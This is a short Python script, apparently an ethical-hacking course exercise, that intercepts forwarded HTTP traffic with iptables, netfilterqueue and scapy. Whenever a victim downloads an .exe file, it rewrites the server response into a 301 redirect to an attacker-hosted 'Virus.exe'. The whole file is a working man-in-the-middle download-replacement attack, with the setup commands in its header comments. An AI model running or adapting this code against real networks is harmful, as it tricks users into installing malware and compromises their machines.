# using Iptable tool in k-linux to put the forwarding packages in a que. Then I will enter the que to modify the packages.
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# To test locally. Change the chain from FORWARD to output and input.

# NB: remember to flush your iptables when you are done. iptables --flush
# user of the program needs to install netfilterqueue (pip install netfilterqueue)

import netfilterqueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    redirect_url = "http://10.0.2.19/Evil_files/Virus.exe"
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # port 80 is http
        if scapy_packet[scapy.TCP].dport == 80:  # request
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] Detected download of .exe file\n")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:  # response
            if scapy_packet[scapy.TCP].seq in ack_list:
                packet.set_payload(str(set_load(scapy_packet, redirect_url)))
    packet.accept()

def set_load(scapy_packet, redirect_url):
    new_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + redirect_url + "\n\n"
    print("[+] Modifying package\n")
    ack_list.remove(scapy_packet[scapy.TCP].seq)
    scapy_packet[scapy.Raw].load = new_load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
